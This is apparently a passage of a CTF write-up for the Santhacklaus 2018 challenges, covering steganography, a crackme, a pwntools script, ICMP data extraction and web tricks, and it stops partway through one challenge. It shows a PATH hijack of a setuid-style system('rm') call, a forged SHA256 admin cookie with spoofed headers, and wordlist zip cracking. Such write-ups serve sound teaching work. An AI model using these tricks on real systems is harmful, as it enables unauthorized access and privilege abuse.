+<em>Fig 2</em>: Web page of the Authentication 2.0
+</center></p>
+
+<p>Ok, what could happen if I change the HTTP Method ?</p>
+
+<pre><code class="language-bash">curl -X POST https://authentication.santhacklaus.xyz/
+[...]
+        &lt;div class=&quot;code green&quot;&gt;
+          &lt;h1&gt;POST&lt;/h1&gt;
+        &lt;/div&gt;
+
+      
+        &lt;div class=&quot;sub red&quot;&gt;
+          &lt;h2&gt;What is your username?&lt;/h2&gt;
+        &lt;/div&gt;
+[...]
+</code></pre>
+
+<p>We can notice 2 things:</p>
+
+<ol>
+<li>The method used is reflected</li>
+<li>The main message changed, it&rsquo;s asking for a username</li>
+</ol>
+
+<p>Now, let&rsquo;s try to give the admin username:</p>
+
+<pre><code class="language-bash">curl -X POST -d &quot;username=admin&quot; https://authentication.santhacklaus.xyz/
+[...]
+        &lt;div class=&quot;sub&quot;&gt;
+          &lt;h2 class=&quot;blue&quot;&gt;Hello admin&lt;/h2&gt;
+          &lt;h3 class=&quot;grey&quot;&gt;IMTLD{Y0u_H4v3_t0_st4rT_s0m3Wh3r3}&lt;/h3&gt;
+        &lt;/div&gt;
+[...]
+</code></pre>
+
+<h2 id="flag-7">Flag</h2>
+
+<blockquote>
+<p>IMTLD{Y0u_H4v3_t0_st4rT_s0m3Wh3r3}</p>
+</blockquote>
+
+<h1 id="xtracted">Xtracted</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Xtracted</td>
+<td>Crypto</td>
+<td>100</td>
+<td>~ 150</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-8">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_xtracted.png" alt="" />
+<em>Fig 1</em>: &ldquo;Xtracted&rdquo; statement
+</center></p>
+
+<h2 id="brainfuck">Brainfuck</h2>
+
+<p>The given file contains some brainfuck code:</p>
+
+<pre><code class="language-raw">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;++++++++++.-.++++.+.&lt;++.+++++++++++++++.---------------.&gt;------------.++++++++++++..----.&lt;+++++++++++++++.++.---.+++.&lt;++++++++++.&gt;&gt;--------.&gt;+++++++++++.++++.+.&lt;&lt;+++++++++.&lt;++++++++++++++++++++++.&gt;-----.----.---.+++++++++.--.-------.++++.--.++.----.+++..++.&lt;++++++++++.&gt;&gt;-----.&gt;-----.-.++++++.---------------.+++++++++.++++++.&lt;&lt;------.&gt;+++++++++++++++++.&gt;+++++.---------.-----------.&lt;&lt;+++++++++++++.&lt;++++++++++++++++++++++.&gt;&gt;&gt;----.+++++++++++++++..----.---.------.--.+++++++++++++++++++.-----------.++++++.-.&lt;&lt;-----------.&gt;&gt;++++++++++.&lt;&lt;--.&gt;&gt;-...&lt;&lt;.&gt;&gt;-----------------.+++++++++.+++.-----.&lt;&lt;.&gt;&gt;++++++++.---.------.-------.+++++++++.-----------.++++++++++++.-----------.+.-.&lt;&lt;&lt;++++++++++.&gt;&gt;&gt;+.+++++++++++++++++++.----.--.&lt;+++++++++++++.++.&gt;++.&lt;++++++.&gt;-----.-.&lt;----------.&gt;-----.+++++.&lt;+++++++.&gt;+.&lt;&lt;++++++++++++++++.++++++++++++.++++.+++++++.--------.--------.&gt;&gt;++++++++++++.&lt;--------------.&gt;-------.--.&lt;&lt;----------------.&gt;+++++++++++.&gt;++.&lt;----.&lt;++++++++++++++++.----------------.&gt;&gt;.&lt;&lt;.&gt;.-----------.&lt;----.&gt;+++++++++++.&gt;--.&lt;&lt;+++.&gt;&gt;-----.&lt;&lt;---.&gt;&gt;+++++++.&lt;&lt;+++.&gt;.&gt;-.&lt;&lt;.&gt;&gt;-.++++.&lt;&lt;.&gt;-------------.&gt;+++++++.
+</code></pre>
+
+<p>A little request on google, the following website did the job:</p>
+
+<blockquote>
+<p><a href="https://copy.sh/brainfuck/">https://copy.sh/brainfuck/</a></p>
+</blockquote>
+
+<p>After running the brainfuck code:</p>
+
+<pre><code class="language-raw">POST / HTTP/1.1Host:*51.75.202.1134Content-Type:Japplication/x-www-form-urlencodedTextraction_info=IMTLD{Xtr4ct_D4t4_T0_r3m0t3_s3rv3R}
+</code></pre>
+
+<h2 id="flag-8">Flag</h2>
+
+<blockquote>
+<p>IMTLD{Xtr4ct_D4t4_T0_r3m0t3_s3rv3R}</p>
+</blockquote>
+
+<h1 id="stego101">Stego101</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Stego101</td>
+<td>Stega</td>
+<td>150</td>
+<td>~ 150</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-9">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_stego101.png" alt="" />
+<em>Fig 1</em>: &ldquo;Stego101&rdquo; statement
+</center></p>
+
+<h2 id="steghide">Steghide</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/stego101_1.jpg" alt="" />
+<em>Fig 2</em>: Start picture
+</center></p>
+
+<p>With an image, I always start looking metadata:</p>
+
+<pre><code class="language-bash">exiftool challenge.jpg
+[...]
+X Resolution                    : 300
+Y Resolution                    : 300
+Comment                         : steghide : doyouknowdaway
+Image Width                     : 297
+Image Height                    : 153
+Encoding Process                : Baseline DCT, Huffman coding
+[...]
+</code></pre>
+
+<p>Steghide will store a little encypted container in a picture and use a passphrase, let&rsquo;s try to decrypt it with <code>doyouknowdaway</code> as passphrase.</p>
+
+<pre><code class="language-bash">steghide extract -sf challenge.jpg
+Enter passphrase: doyouknowdaway
+wrote extracted data to &quot;flag.txt&quot;.%
+</code></pre>
+
+<h2 id="flag-9">Flag</h2>
+
+<p>And then in <code>flag.txt</code>:</p>
+
+<blockquote>
+<p>IMTLD{st3g4N0gr4phY_c4N_b3_r34llY_s1mpl3}</p>
+</blockquote>
+
+<h1 id="crackme-1">Crackme_1</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Crackme_1</td>
+<td>Crackme</td>
+<td>150</td>
+<td>~ 150</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-10">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_crackme1.png" alt="" />
+<em>Fig 1</em>: &ldquo;Crackme_1&rdquo; statement
+</center></p>
+
+<h2 id="ltrace">ltrace</h2>
+
+<p>The program is asking for a password. Let&rsquo;s ltrace this program:</p>
+
+<pre><code class="language-bash">ltrace ./crackme_1 bitedepoulet
+strlen(&quot;hackerman&quot;)                              = 9
+strlen(&quot;hackerman&quot;)                              = 9
+puts(&quot;Password incorrect&quot;)                       = 19
+Password incorrect
++++ exited (status 0) +++
+</code></pre>
+
+<p>The password looks to be <code>hackerman</code>.</p>
+
+<h2 id="flag-10">Flag</h2>
+
+<pre><code class="language-bash">./crackme_1 hackerman
+Access granted !
+Flag : IMTLD{Y0uAr34H4ck3rH4rry}
+</code></pre>
+
+<h1 id="menthal-arithmetic">Menthal arithmetic</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Menthal arithmetic</td>
+<td>Prog</td>
+<td>150</td>
+<td>~ 120</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-11">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_menthalarithmetic.png" alt="" />
+<em>Fig 1</em>: &ldquo;Menthal arithmetic&rdquo; statement
+</center></p>
+
+<pre><code class="language-bash">nc 51.75.202.113 10001
+
+Welcome !!
+You must calculate the square root of the 1st number, multiply the result by the cube of the 2nd number and send the integer part of the final result...
+I almost forget, you only have 2 seconds to send me the result
+1st number : 5356 
+2nd number : 8639
+</code></pre>
+
+<h2 id="scripting-time">Scripting time</h2>
+
+<p>So, the first and the second number are changing, but the operation remains the same. Here is the operation:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/ari1.png" alt="" />
+<em>Fig 2</em>: Math formula
+</center></p>
+
+<p>I used <code>pwn</code> library for the netcat connection, it&rsquo;s much more easier than <code>socket</code> or others lib.</p>
+
+<h2 id="final-script">Final script</h2>
+
+<pre><code class="language-python">#!/usr/bin/python2
+
+from pwn import *
+import math
+
+r = remote(&quot;51.75.202.113&quot;, 10001)
+sleep(0.5)
+print r.recvuntil(&quot;have 2 seconds to send me the result&quot;)
+sleep(0.5)
+#print r.recv(4096).split('\n')
+
+statement = r.recv(4096).split('\n')
+
+num1 = statement[1].split(' ')[3]
+num2 = statement[2].split(' ')[3]
+
+num1sqrt = math.sqrt(float(num1))
+num2cube = math.pow(float(num2),3)
+res = int(num1sqrt * num2cube)
+
+r.sendline(str(res))
+print r.recv(4096)
+</code></pre>
+
+<h2 id="flag-11">Flag</h2>
+
+<pre><code class="language-bash">./decode.py
+Congratz!! Flag : IMTLD{TheFastestManAlive}
+</code></pre>
+
+<h1 id="the-flag-grabber">The flag grabber</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>The flag grabber</td>
+<td>Web</td>
+<td>150</td>
+<td>~ 120</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-12">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_flaggrabber.png" alt="" />
+<em>Fig 1</em>: &ldquo;The flag grabber&rdquo; statement
+</center></p>
+
+<h2 id="javascript-is-amazing">JavaScript is amazing</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/flaggrab1.png" alt="" />
+<em>Fig 2</em>: Base index
+</center></p>
+
+<p>The <code>I want my flag!</code> button is following the mouse, it&rsquo;s pretty annoying, let&rsquo;s remove the JavaScript code.</p>
+
+<p>In fact, I removed all JavaScript code in the webpage (using the firefox webconsole), removed the <code>div</code> containing the button and edit the <code>id</code> of the <code>form</code>:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/flaggrab2.png" alt="" />
+<em>Fig 3</em>: Cute button appears
+</center></p>
+
+<p>A new button appeared, let&rsquo;s click on it :D</p>
+
+<h2 id="flag-12">Flag</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/flaggrab3.png" alt="" />
+<em>Fig 4</em>: Flag
+</center></p>
+
+<blockquote>
+<p>IMTLD{J4v4scRipT_iS_W0nD3rFuL}</p>
+</blockquote>
+
+<h1 id="on-the-road-again">On the road again</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>The flag grabber</td>
+<td>Web</td>
+<td>150</td>
+<td>~ 120</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-13">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_ontheroad.png" alt="" />
+<em>Fig 1</em>: &ldquo;On the road again&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art">State of the art</h2>
+
+<p>When you&rsquo;re logged on, you only have 2 files:</p>
+
+<ul>
+<li>ch1</li>
+<li>ch1.c</li>
+</ul>
+
+<p>The C file contains the following code:</p>
+
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(void) {
+
+    system(&quot;rm /home/challenger1/.flag&quot;);
+    return 0;
+
+}
+</code></pre>
+
+<p>Ok, then this program simply call the <code>rm</code> command, there is an old trick by changing the <code>PATH</code> variable to hook a system command.</p>
+
+<h2 id="hook">Hook</h2>
+
+<p>First, I have to create a script called <code>rm</code> somewhere with write permission, <code>tmp</code> folder seems to be a great choice.</p>
+
+<pre><code class="language-bash">$ echo '#!/bin/cat' &gt; /tmp/rm
+$ cat /tmp/rm
+#!/bin/cat 
+$ chmod +x /tmp/rm
+</code></pre>
+
+<p>And now, we have to change the <code>PATH</code> in order to call our custom script instead of the real <code>rm</code> command.</p>
+
+<pre><code class="language-bash">$ PATH=/tmp
+</code></pre>
+
+<h2 id="flag-13">Flag</h2>
+
+<pre><code class="language-bash">$ ./ch1
+#!/bin/cat
+IMTLD{Th1s0neW4sSymPATH3t1c2}
+</code></pre>
+
+<h1 id="pong">Pong</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Pong</td>
+<td>Network</td>
+<td>200</td>
+<td>~ 60</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-14">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_pong.png" alt="" />
+<em>Fig 1</em>: &ldquo;Pong&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-1">State of the art</h2>
+
+<p>Start with a PCAP file. With this title, it must contains ICMP packets. I just opened <code>tshark</code>:</p>
+
+<pre><code class="language-bash">$ tshark -r challenge.pcapng -Y icmp.resp_to -Tfields -e data.text
+[Some base64 stuff]
+</code></pre>
+
+<p>Ok, then let&rsquo;s remove all line return and decode it:</p>
+
+<pre><code class="language-bash">$ tshark -r challenge.pcapng -Y icmp.resp_to -Tfields -e data.text | tr -d '\n' | base64 -d &gt; file.out
+
+$ file file.out
+file.out: PNG image data, 487 x 272, 8-bit/color RGBA, non-interlaced
+</code></pre>
+
+<h2 id="flag-14">Flag</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/pong_1.png" alt="" />
+</center></p>
+
+<h1 id="qrencoded">QREncoded</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>QREncoded</td>
+<td>Prog</td>
+<td>200</td>
+<td>~ 120</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-15">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_qrencoded.png" alt="" />
+<em>Fig 1</em>: &ldquo;QREncoded&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-2">State of the art</h2>
+
+<p>Ok, we&rsquo;re starting with a Zip archive containing&hellip; 843 QRCodes!</p>
+
+<p><center>
+    <img src="https://media.giphy.com/media/r1HGFou3mUwMw/giphy.gif">
+</center></p>
+
+<h2 id="scripting-time-or-not">Scripting time&hellip; Or not</h2>
+
+<p>In fact, I don&rsquo;t have to script something because the <code>zbar</code> tool in Linux is used to decode QRCode. I only did a little loop, concatenate the base64 in output and decode the data.</p>
+
+<pre><code class="language-bash">$ for i in {0..843}; do zbarimg -q --raw part_$i.png; done | tr -d '\n' | base64 -d &gt; file.out
+$ file file.out
+file.out: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, Exif Standard: [TIFF image data, little-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2, software=GIMP 2.10.6, datetime=2018:11:15 22:24:26], progressive, precision 8, 423x532, components 3
+</code></pre>
+
+<h2 id="flag-15">Flag</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/qrencoded_1.jpg" alt="" />
+<em>Fig 2</em>: Flag
+</center></p>
+
+<h1 id="love">love.</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>love.</td>
+<td>Web</td>
+<td>200</td>
+<td>~ 100</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-16">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_love.png" alt="" />
+<em>Fig 1</em>: &ldquo;love.&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-3">State of the art</h2>
+
+<p>The <strong>key.pub</strong> file is not a real PGP key. In fact, if you remove the header and the footr and only keep the base64 data, you can decode it and get a SVG file.</p>
+
+<pre><code class="language-bash">$ cat key.pub | tail -n+4 | head -n-1 | base64 -d &gt; file.svg
+</code></pre>
+
+<h2 id="inkscape">inkscape</h2>
+
+<p>This is a SVG editor, honestly, it&rsquo;s not user friendly, it&rsquo;s ugly and I don&rsquo;t like to use it. I don&rsquo;t have other choice :-(</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/love_1.png" alt="" />
+<em>Fig 2</em>: SVG opened in inkscape
+</center></p>
+
+<p>In inkscape, you can list all SVG object with this feature:</p>
+
+<blockquote>
+<p>Object &gt; Objects&hellip;</p>
+</blockquote>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/love_2.png" alt="" />
+<em>Fig 3</em>: New panel
+</center></p>
+
+<p>Ok, now you can hide see something strange when you go through the <strong>g1391</strong> object:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/love_3.gif" alt="" />
+<em>Fig 4</em>: Little element everywhere
+</center></p>
+
+<p>I think all those little element composed the flag. And now, we have to understand how to use this f*cking software :)</p>
+
+<h2 id="flag-16">Flag</h2>
+
+<p>I just hide the white rectangle on the front, played with opacity and&hellip; Tada:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/love_4.png" alt="" />
+<em>Fig 5</em>: Flag
+</center></p>
+
+<h1 id="srht">SRHT</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>SRHT</td>
+<td>Web</td>
+<td>200</td>
+<td>~ 100</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-17">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_srht.png" alt="" />
+<em>Fig 1</em>: &ldquo;SRHT&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-4">State of the art</h2>
+
+<p>At the first visit, we&rsquo;re seeing the index page:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/srht_1.png" alt="" />
+<em>Fig 2</em>: Index page at first connection
+</center></p>
+
+<p>And after a refresh, we are reading this:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/srht_2.png" alt="" />
+<em>Fig 3</em>: Index page at second connection
+</center></p>
+
+<h2 id="cookie">Cookie</h2>
+
+<p>Obiously, the website is remembering me. How? I think about those element:</p>
+
+<ul>
+<li>Log IP address</li>
+<li>Generate a cookie</li>
+</ul>
+
+<p>The easiest one to check was the cookie:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/srht_3.png" alt="" />
+<em>Fig 4</em>: Cookie
+</center></p>
+
+<p>The cookie looks to <code>SHA256</code> hash, let&rsquo;s try to crack it on crackstation.net:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/srht_4.png" alt="" />
+<em>Fig 5</em>: Hash cracked
+</center></p>
+
+<p>Hmmm.. <code>stranger</code> ? What could happen if I&rsquo;m setting my cookie with the SHA256 of <code>admin</code> ?</p>
+
+<pre><code class="language-bash">$ echo -n 'admin' | sha256sum
+8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918  -
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/srht_5.png" alt="" />
+<em>Fig 6</em>: Almost admin
+</center></p>
+
+<h2 id="curling-again">Curling again</h2>
+
+<p>Ok, now I have to configure my <code>User-Agent</code> and <code>Referer</code> HTTP Headers:</p>
+
+<pre><code class="language-bash">$ curl -H &quot;User-Agent: Black Hat Browser&quot; \
+	-H &quot;Referer: russian.deep-web.org&quot; \
+	--cookie &quot;connexion=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918&quot; \
+	https://srht.santhacklaus.xyz/
+[...]
+&lt;li&gt;&lt;a href=&quot;&quot;&gt;Consult secret documents&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/br&gt; Well done ! Take your flag: IMTLD{B3c4u5e_sQL_iNj3cti0n5_4r3_0v3r4tt3D}&lt;/div&gt;
+&lt;/center&gt;
+[...]
+</code></pre>
+
+<h2 id="flag-17">Flag</h2>
+
+<blockquote>
+<p>IMTLD{B3c4u5e_sQL_iNj3cti0n5_4r3_0v3r4tt3D}</p>
+</blockquote>
+
+<h1 id="trollologuess">Trollologuess</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Trollologuess</td>
+<td>GUESSIIIIIIING</td>
+<td>200</td>
+<td>~ 10</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-18">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_trollologuess.png" alt="" />
+<em>Fig 1</em>: &ldquo;Trollologuess&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-5">State of the art</h2>
+
+<p>In this challenge, the entry point is a f*cking PNG file. After downloading it, I immediatly runs <code>binwalk</code> on it:</p>
+
+<pre><code class="language-bash">$ binwalk challenge.png
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 1920 x 1080, 8-bit/color RGBA, non-interlaced
+136           0x88            Zlib compressed data, best compression
+1340310       0x147396        gzip compressed data, from Unix, last modified: 2018-12-18 01:39:10
+</code></pre>
+
+<p>Hmmm&hellip; I&rsquo;m not an expert, but I think PNG files doesn&rsquo;t embed gzip archive usually! For the extraction, sometimes binwalk is a bit whimsical. To force an extraction we have to use <code>--dd=&quot;.*&quot;</code> argument:</p>
+
+<pre><code class="language-bash">$ binwalk --dd=&quot;.*&quot;
+[Same output as above]
+
+$ file _challenge.png.extracted/*
+_challenge.png.extracted/0:      PNG image data, 1920 x 1080, 8-bit/color RGBA, non-interlaced
+_challenge.png.extracted/147396: gzip compressed data, last modified: Tue Dec 18 01:39:10 2018, from Unix
+_challenge.png.extracted/88:     zlib compressed data
+
+$ mv _challenge.png.extracted/147396 dick.gz
+$ file dick.gz 
+dick.gz: gzip compressed data, last modified: Tue Dec 18 01:39:10 2018, from Unix
+
+$ gzip -d dick.gz
+$ file dick 
+dick: POSIX tar archive (GNU)
+
+$ tar xvf dick
+step1.zip
+step2.zip 
+step3.zip
+
+$ unzip step1.zip
+$ file step1
+step1: PNG image data, 1500 x 1000, 8-bit/color RGB, non-interlaced
+</code></pre>
+
+<p>Ok, go guessing.</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/26BRPdtti5poNUoU0/giphy.gif" alt="" />
+</center></p>
+
+<h2 id="step1">Step1</h2>
+
+<p>Here is the picture:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/guess_step1.png" alt="" />
+<em>Fig 2</em>: Step1
+</center></p>
+
+<p>Because I&rsquo;m corporate with my team, I&rsquo;m using: <a href="https://aperisolve.fr">https://aperisolve.fr</a></p>
+
+<p>Zeecka made this tool to analyze picture, it&rsquo;s like stegsolve and zsteg with a web front. Very cool.</p>
+
+<p>And in zsteg output we can find:</p>
+
+<blockquote>
+<p>b1,r,lsb,yx .. text: &ldquo;1_H0p3_U_st1ll_h4v3_h0p3&rdquo;</p>
+</blockquote>
+
+<p>So:</p>
+
+<pre><code class="language-bash">$ unzip step2.zip
+Archive step2.zip 
+[step2.zip] Password: 1_H0p3_U_st1ll_h4v3_h0p3
+  inflating: step2
+
+$ file step2
+step2: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1024x576, frames 3 
+</code></pre>
+
+<h2 id="step2">Step2</h2>
+
+<p>Here is the picture:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/guess_step2.jpg" alt="" />
+<em>Fig 3</em>: Step2
+</center></p>
+
+<p>I spent loooooooot of time on this one, really. After a long time, I finally find a tool: <code>outguess</code>
+Available in my Ubuntu repository.</p>
+
+<p>This tool needs a password, then I guess it was <strong>WHAT</strong>, because the tool is <strong>OUTGUESS</strong>.</p>
+
+<pre><code class="language-bash">$ outguess -k WHAT -r step2.jpg bitedepoulet
+Reading step2.jpg....
+Extracting usable bits:   62448 bits
+Steg retrieve: seed: 26, len: 43
+
+$ cat bitedepoulet
+Pass for step3 is AreUr34Dy_4_wh4T5_C0minG
+
+$ unzip step3.zip
+Archive step3.zip 
+[step3.zip] Password: AreUr34Dy_4_wh4T5_C0minG
+  inflating: step3
+
+$ file step3
+step3: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, mono 11025 Hz
+</code></pre>
+
+<h2 id="step3">Step3</h2>
+
+<p>The real deal is here. Still with a pinch of guessing, which CTF with an annoying WAV file <code>Shutdown</code> did&hellip;</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/3oz8xP6SaSkSU9dhcI/giphy.gif" alt="" />
+</center></p>
+
+<p>Yes! <code>European Cyber Week Quals</code>, and who did a little writeups about some tasks? :D</p>
+
+<p>So you can find the trick here: <a href="https://maki.bzh/courses/blog/writeups/qualecw2018/#drone-wars-1">https://maki.bzh/courses/blog/writeups/qualecw2018/#drone-wars-1</a></p>
+
+<p>I will try to be a bit me explicit in this here. I followed this tutorial: <a href="https://www.chonky.net/hamradio/decoding-sstv-from-a-file-on-a-linux-system">https://www.chonky.net/hamradio/decoding-sstv-from-a-file-on-a-linux-system</a></p>
+
+<p>First, you need to install <code>QSSTV</code> and <code>vlc</code> on linux, I&rsquo;m using Ubuntu 16.04.</p>
+
+<pre><code class="language-bash">$ sudo apt install qsstv vlc 
+$ pactl load-module module-null-sink sink_name=virtual-cable
+24
+</code></pre>
+
+<p>Now you have an audio virtual cable created, the <code>Null output</code>. You have to set your system to use this virtual cable for sounds in <code>QSSTV</code> and <code>VLC</code>. In <code>pavucontrol</code> you can follow the above link.</p>
+
+<p>Here is an ugly GIF:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/guess_step3.gif" alt="" />
+</center></p>
+
+<h2 id="flag-18">Flag</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/guess_flag.png" alt="" />
+</center></p>
+
+<h1 id="can-you-see-the-flag">Can you SEE the flag</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Can&nbsp;you&nbsp;SEE&nbsp;the&nbsp;flag</td>
+<td>&ldquo;Stegoguess&rdquo;</td>
+<td>200</td>
+<td>~ 25</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-19">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_seeflag.png" alt="" />
+<em>Fig 1</em>: &ldquo;Can you SEE the flag&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-6">State of the art</h2>
+
+<p>Let&rsquo;s start with a Zip again. The archive is password protected. <code>fcrackzip</code> will found the password:</p>
+
+<pre><code class="language-bash">$ fcrackzip -v -D -u -p /home/maki/Tools/wordlist/rockyou.txt Video.zip
+found file 'Why ?.mp4', (size cp/uc 23018221/23033977, flags 9, chk 8c48)
+
+
+PASSWORD FOUND!!!!: pw == cheese
+
+$ unzip Video.zip 
+Archive:  Video.zip
+[Video.zip] Why ?.mp4 password: cheese
+  inflating: Why ?.mp4
+</code></pre>
+
+<h2 id="some-shitty-qr-code">Some shitty QR Code</h2>
+
+<p>Ooooooooook, I found a QR Code in the video, first, I tried to split the video into picture:</p>
+
+<pre><code class="language-bash">$ ffmpeg -i ../Why\ \?.mp4 -r 1000 -f image2 image-%07d.jpg
+</code></pre>
+
+<p>Bad idea. It filled my disk. Thanks.</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/5mYpn1V4082JLmLKvy/giphy.gif" alt="" />
+</center></p>
+
+<h2 id="extracting-the-sound">Extracting the sound</h2>
+
+<p>After this failed, I tried to extract the sound as WAV file:</p>
+
+<pre><code class="language-bash">$ ffmpeg -i ../Why\ \?.mp4 bitedepoulet.wav 
+</code></pre>
+
+<p>With a WAV in steganography, the first move should be the spectrum analysis. I used <code>spek</code> first:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/seeflag_1.png" alt="" />
+</center></p>
+
